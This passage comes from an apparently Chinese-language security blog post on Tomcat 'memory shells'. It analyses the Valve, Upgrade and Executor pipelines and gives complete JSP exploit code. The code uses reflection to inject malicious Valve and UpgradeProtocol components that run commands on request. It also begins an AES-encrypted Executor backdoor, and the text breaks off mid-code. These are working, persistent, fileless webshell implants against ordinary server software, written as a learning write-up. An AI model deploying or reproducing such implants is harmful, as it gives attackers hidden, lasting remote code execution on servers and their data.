valve)</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//恶意代码</span><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后就能白屏弹计算器</p><p><img src="https://cdn.clown2024.cn/202409211550418.png" alt="image-20240921155025355"></p><p><img src="https://cdn.clown2024.cn/202409211550385.png" alt="image-20240921155045287"></p><p>在这篇文章看到一个更简单的获取standardContext的方法：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 更简单的方法 获取StandardContext  </span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);  <br> reqF.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext(); <br></code></pre></td></tr></table></figure><h1 id="tomcat-upgrade内存马"><a href="#Tomcat-Upgrade内存马" class="headerlink" title="Tomcat-Upgrade内存马"></a>Tomcat-Upgrade内存马</h1><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里参考文章：<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p>放一张文章的连接器图</p><p><img src="https://cdn.clown2024.cn/202409222103688.webp" alt="图片"></p><p>该内存马就是在到达Container之前的利用，因为可能会由于Filter的过滤或者反代导致我们找不到路径，导致我们的利用Container内组件的内存马无法使用</p><p>首先抽象类<strong>AbstractProcessorLight</strong>的process方法中，会根据当前<code>SocketWrapperBase</code>的状态进行响应，在<code>OPEN_READ</code>状态时，会调用对应的<code>Processor</code>的service方法进行处理</p><p><img src="https://cdn.clown2024.cn/202409222122170.png" alt="image-20240922212210064"></p><p>这里Http请求调用的就是Http11Processor#service，然后它里面有处理Upgrade的逻辑</p><p><img src="https://cdn.clown2024.cn/202409222127551.png" alt="image-20240922212744457"></p><p>这里的protocol是Http11NioProtocol，看一下他的getUpgradeProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409222129320.png" alt="image-20240922212924262"></p><p>这里走到的是父类的方法，可以看到就是返回一个UpgradeProtocol，httUpgradeProtocols是一个hashMap；获取了upgradeProtocol之后，它下面还调用了他的accept方法</p><p>欸那这里内存马的思路就出来了，和之前的也很类似</p><p>首先这个UpgradeProtocol是一个接口</p><p><img src="https://cdn.clown2024.cn/202409222140816.png" alt="image-20240922214008767"></p><p>那么我们只要构造一个恶意的UpgradeProtocol的实现类，添加进我们前面的提到的httpUpgradeProtocols里面即可</p><p>那么现在就是要找这个httpUpgradeProtocols怎么获取，这里先跟文章看看httpUpgradeProtocols是哪里被赋值的</p><p><img src="https://cdn.clown2024.cn/202409222144324.png" alt="image-20240922214420260"></p><p>在AbstractHttp11Protocol#init方法里面对upgradeProtocols进行了遍历，然后调用了configureUpgradeProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409222146364.png" alt="image-20240922214605304"></p><p>然后该方法upgradeProtocol添加到hashMap中</p><blockquote><p>upgradeProtocols是在tomcat启动的时候进行初始化</p></blockquote><h2 id="内存马编写"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>第一步先找到Http11NioProtocol，我们可以在<strong>request.request.connector.protocolHandler</strong>中找到</p><p><img src="https://cdn.clown2024.cn/202409222151834.png" alt="image-20240922215129782"></p><p><img src="https://cdn.clown2024.cn/202409222151796.png" alt="image-20240922215134740"></p><p>然后httpUpgradeProtocols属性就在里面，我们需要用反射去获取，我看了一下没有直接get的方法</p><p>第二步就是编写恶意的UpgradeProtocol了</p><p><strong>exp</strong></p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.HashMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.反射获取httpUpgradeProtocols</span><br>    <span class="hljs-type">RequestFacade</span> <span class="hljs-variable">rf</span> <span class="hljs-operator">=</span> (RequestFacade) request;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> RequestFacade.class.getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    requestField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request1</span> <span class="hljs-operator">=</span> (Request) requestField.get(rf);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> Request.class.getDeclaredField(<span class="hljs-string">&quot;connector&quot;</span>);<br>    connector.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Connector</span> <span class="hljs-variable">realConnector</span> <span class="hljs-operator">=</span> (Connector) connector.get(request1);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolHandlerField</span> <span class="hljs-operator">=</span> Connector.class.getDeclaredField(<span class="hljs-string">&quot;protocolHandler&quot;</span>);<br>    protocolHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">AbstractHttp11Protocol</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);<br><br>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">upgradeProtocolsField</span> <span class="hljs-operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="hljs-string">&quot;httpUpgradeProtocols&quot;</span>);<br>    upgradeProtocolsField.setAccessible(<span class="hljs-literal">true</span>);<br>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);<br>    <span class="hljs-comment">//2.构造恶意的UpgradeProtocol</span><br>    <span class="hljs-type">UpgradeProtocol</span> <span class="hljs-variable">upgradeProtocol</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpgradeProtocol</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHttpUpgradeName</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isSSLEnabled)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getAlpnIdentifier() &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAlpnName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Processor <span class="hljs-title function_">getProcessor</span><span class="hljs-params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> InternalHttpUpgradeHandler <span class="hljs-title function_">getInternalUpgradeHandler</span><span class="hljs-params">(Adapter adapter, org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//3.添加进upgradeProtocols</span><br>    upgradeProtocols.put(<span class="hljs-string">&quot;clown&quot;</span>,upgradeProtocol);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后访问的时候带上upgrade</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Upgrade: clown<br>Connection: Upgrade<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409222209433.png" alt="image-20240922220915371"></p><p><img src="https://cdn.clown2024.cn/202409222210497.png" alt="image-20240922221016377"></p><p>成功弹计算器</p><h1 id="tomcat-executor内存马"><a href="#Tomcat-Executor内存马" class="headerlink" title="Tomcat-Executor内存马"></a>Tomcat-Executor内存马</h1><p>参考文章：<a href="https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ">https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ</a></p><h2 id="执行流程分析"><a href="#执行流程分析" class="headerlink" title="执行流程分析"></a>执行流程分析</h2><p>这里临时插入重新分析一下Connector的流程，因为有点乱，导致我后面看Executor内存马会有点混乱</p><p><strong>服务的启动时</strong></p><p>这里就说一下各个类的初始化的顺序，从StandardService的初始化方法开始</p><p><img src="https://cdn.clown2024.cn/202409262315547.png" alt="image-20240926231523449"></p><blockquote><p>图只是参考，具体方法不一定对，因为是别人画的图，可能tomcat版本不一样方法名会有差异，这里按照的是我自己的版本分析</p></blockquote><p>StandardService#initInternal</p><p><img src="https://cdn.clown2024.cn/202409262320249.png" alt="image-20240926232011146"></p><p>这里执行了图中的三个init方法，重点看init方法，这里有executor.init()方法，但是此时executors数组为空所以没有执行，应该是在后面有请求的时候放入</p><p>这个connector是Connector类，然后init去到了父类LifecycleBase的init方法</p><p><img src="https://cdn.clown2024.cn/202409262327581.png" alt="image-20240926232630314"></p><p>然后再调用initInternal方法回到Connector</p><p><img src="https://cdn.clown2024.cn/202409262328153.png" alt="image-20240926232843081"></p><p>然后调用Http11NioProtocol#setAdapter设置一个adapter</p><p>然后往下调用了protocolHandler#init()方法</p><p><img src="https://cdn.clown2024.cn/202409262329171.png" alt="image-20240926232959094"></p><p>然后又走到父类AbstractHttp11Protocol的init方法</p><p><img src="https://cdn.clown2024.cn/202409262331554.png" alt="image-20240926233137474"></p><p>然后又掉用父类的AbstractProtocol的init方法</p><p><img src="https://cdn.clown2024.cn/202409262332748.png" alt="image-20240926233241664"></p><p>里面又调用NioEndpoint的init方法</p><p>然后又是走到父类AbstractJsseEndpoint的init方法</p><p><img src="https://cdn.clown2024.cn/202409262334655.png" alt="image-20240926233401589"></p><p>然后又调用父类的AbstractEndpoint的init方法</p><p><img src="https://cdn.clown2024.cn/202409262335562.png" alt="image-20240926233521470"></p><p>这里的bind方法就是调用NioEndpoint的bind方法来起一个socket服务监听端口了</p><p><img src="https://cdn.clown2024.cn/202409262336888.png" alt="image-20240926233650811"></p><p>默认的acceptCount是100，然后这就是大概的流程</p><p>顺便提一下，一开始的connector是有两个的，如下：</p><p><img src="https://cdn.clown2024.cn/202409262352133.png" alt="image-20240926235226049"></p><p><strong>接受请求后的分析</strong></p><p>这里就分析到Executor的位置，因为这是临时插入的下面已经写好了懒得动了😢</p><p>前面文章说到，接受了请求之后会传递给setSocketOptions方法</p><p><img src="https://cdn.clown2024.cn/202409270008999.png" alt="image-20240927000803914"></p><p>然后这里获取了Poller注册了channel</p><p><img src="https://cdn.clown2024.cn/202409270009941.png" alt="image-20240927000918856"></p><p>然后这个Poller也是实现了Runnable接口的，那后面就会走到他的run方法里面，我们看一下</p><p><img src="https://cdn.clown2024.cn/202409270011717.png" alt="image-20240927001157616"></p><p>然后processKey里面又会走到一个processSocket方法</p><p><img src="https://cdn.clown2024.cn/202409270012045.png" alt="image-20240927001244969"></p><p>然后就会走到我们要重点关注的<strong>executor.execute</strong>方法</p><p><img src="https://cdn.clown2024.cn/202409270013273.png" alt="image-20240927001342167"></p><blockquote><p>大概就是这样，但是调试的时候有时候流程还是会变得很怪，尤其是中间跳到Executor那一块，调的并不是很明白</p></blockquote><h2 id="原理分析"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h2><p>参考文章：<a href="https://xz.aliyun.com/t/11593?time__1311=n4+hiIqGx0xfxCw4mqGNapDNDkIetK4GOexAoTD&u_atoken=0088f6c6149c7ae10aab8ab2e8ed1bd8&u_asig=0a472f9217270143300633216e003d">Executor内存马的实现 - 先知社区 (aliyun.com)</a></p><p>这里又引用文章中connector的结构图：</p><p><img src="https://cdn.clown2024.cn/202409230948596.png" alt="image-20240923094855433"></p><p>connector就分为ProtocolHandler和Adapter，ProtocolHandler就用来处理请求，Adapter就是connector和container的桥梁，用于将处理后的请求传递给container</p><p>有关于ProtocolHandler的分类在前面的内存马也了解了一点，文章中又做了一个导图来分类更加清晰，也放一下</p><p><img src="https://cdn.clown2024.cn/202409230957003.png" alt="image-20240923095712898"></p><p>这里关注Http11NioProtocol的实现</p><p>Endpoint是ProtocolHandler的组成之一，而NioEndpoint是Http11NioProtocl中的实现。<br>Endpoint五大组件：</p><ul><li>LimitLatch：连接控制器，负责控制最大的连接数</li><li>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller</li><li>Poller：可以将其看成是NIO中Selector，负责监控Channel的状态</li><li>SocketProcessor：可以看成是一个被封装的任务类</li><li>Executor：Tomcat自己扩展的线程池，用来执行任务类</li></ul><p>重点看Executor的过程</p><p><img src="https://cdn.clown2024.cn/202409242331554.png" alt="image-20240924233136428"></p><p>我们这里在AbstractEndPoint#processSocket方法处打断点，可以看到他这里创建了一个Executor，然后下一步execute了一个线程任务</p><blockquote><p>在Tomcat中Executor由Service维护，因此同一个Service中的组件可以共享一个线程池。如果没有定义任何线程池，相关组件( 如Endpoint)会自动创建线程池，此时，线程池不再共享。</p></blockquote><p>跟进去execute方法看看</p><p><img src="https://cdn.clown2024.cn/202409242335057.png" alt="image-20240924233503993"></p><p><img src="https://cdn.clown2024.cn/202409242335760.png" alt="image-20240924233534681"></p><p>所以知道逻辑后和前面一样，继承对应的类然后将恶意代码重写进方法里面</p><p>这里的Executor类是ThreadPoolExecutor类</p><p><img src="https://cdn.clown2024.cn/202409271641484.png" alt="image-20240927164111381"></p><p>该类继承的源头就是Executor接口</p><p><img src="https://cdn.clown2024.cn/202409271644613.png" alt="image-20240927164456561"></p><p>文章中是继承了ThreadPoolExecutor类然后重写了execute方法，然后通过AbstractEndPoint的setExecutor方法将原来的executor替换为我们的恶意类即可</p><p><img src="https://cdn.clown2024.cn/202409271652002.png" alt="image-20240927165222949"></p><p><strong>替换Executor</strong></p><p>那要怎么替换executor呢，那照例最好也是从request看能不能找到AbstractEndPoint对象，恰好我们能找到这样的路径</p><p>request(RequestFacade)–&gt;request(Request)–&gt;connector(Connector)–&gt;protocolHandler(Http11NioProtocol)–&gt;endpoint(NioEndpoint)–&gt;acceptors(AbstractEndpoint)</p><p>然后也是和前面一样反射获取然后调用setExecutor方法即可</p><p><strong>回显问题</strong></p><p>现在我们虽然可以替换了，但是数据还无法回显出来，因为我们的ServletRequest还没有封装，需要到后面的Processor阶段才行，我们当前还在EndPoint阶段</p><p>那就需要我们能够挖掘出哪个对象里面存放着Request对象，我们需要挖出一条链子，然后我们往Request对象上封装我们的命令结果，比如将结果添加到请求头上回显出来</p><p>挖掘参考这篇文章，属实是学到了：<a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p><p>里面有一个对象搜索工具，可以很方便的完成对request对象的搜索：<a href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p><blockquote><p>这个工具只有源码，我使用的时候是先用maven的install指令导出jar包到本地仓库，然后再通过pom文件来引入</p></blockquote><p>然后根据文档用下面代码搜索request</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;<br><span class="hljs-keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@WebServlet(&quot;/test&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//设置搜索类型包含ServletRequest，RequstGroup，Request...等关键字的对象</span><br>        List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;request&quot;</span>).build());<br>        <span class="hljs-comment">//设置黑名单</span><br>        List&lt;Blacklist&gt; blacklists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        blacklists.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blacklist</span>.Builder().setField_type(<span class="hljs-string">&quot;java.io.File&quot;</span>).build());<br>        <span class="hljs-comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span><br>        <span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);<br>        <span class="hljs-comment">//打开调试模式</span><br>        searcher.setIs_debug(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//挖掘深度为20</span><br>        searcher.setMax_search_depth(<span class="hljs-number">20</span>);<br>        <span class="hljs-comment">//设置报告保存位置</span><br>        searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\ServletShell&quot;</span>);<br>        searcher.searchObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409272014082.png" alt="image-20240927201422968"></p><p>这里给出了很多的链子，我们Ctrl+F去搜索**request &#x3D;**找一下能利用的，文章中找的是这条链子</p><p><img src="https://cdn.clown2024.cn/202409272035854.png" alt="image-20240927203519789"></p><p>里面有个NioEndpoint，刚好是我们能获取到的，我们在这里下断点然后step over去调试</p><p><img src="https://cdn.clown2024.cn/202409272028044.png" alt="image-20240927202757759"></p><p>打完断点之后我们就到堆栈的Thread的位置开始顺着链子找</p><p><img src="https://cdn.clown2024.cn/202409272105715.png" alt="image-20240927210521619"></p><p>最终我们可以找到request</p><p>然后再往里找，可以找到一个inputBuffer，里面存放着我们的GET内容</p><p><img src="https://cdn.clown2024.cn/202409272109789.png" alt="image-20240927210934698"></p><p>可以将字节数组view as string，然后查看即可，现在我们就可以做到将命令放入request的请求头中，下一步就是要将其作为response的header传出</p><p>这里response对象和request在同一级下，都在connections里面</p><p><img src="https://cdn.clown2024.cn/202409272120291.png" alt="image-20240927212000209"></p><p>这样response我们也有了，提前将结果封装进response即可，现在就来编写内存马</p><h2 id="内存马编写"><a href="#内存马编写-2" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>留个坑先，分析得好累也还没明白，别人的内存马exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.ArrayList&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.concurrent.RejectedExecutionHandler&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SECRET_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;blueblueblueblue&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] KEY_VI = <span class="hljs-string">&quot;blueblueblueblue&quot;</span>.getBytes();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CIPHER_ALGORITHM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">base64Encoder</span> <span class="hljs-operator">=</span> java.util.Base64.getEncoder();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">base64Decoder</span> <span class="hljs-operator">=</span> java.util.Base64.getDecoder();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br><br>            <span class="hljs-type">byte</span>[] byteContent = base64Decoder.decode(content);<br>            <span class="hljs-type">byte</span>[] byteDecode = cipher.doFinal(byteContent);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(byteDecode, java.nio.charset.StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String key, String content)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            javax.crypto.<span class="hljs-type">SecretKey</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), AES);<br>            javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);<br>            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.IvParameterSpec(KEY_VI));<br>            <span class="hljs-type">byte</span>[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);<br>            <span class="hljs-type">byte</span>[] byteAES = cipher.doFinal(byteEncode);<br>            <span class="hljs-keyword">return</span> base64Encoder.encodeToString(byteAES);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span 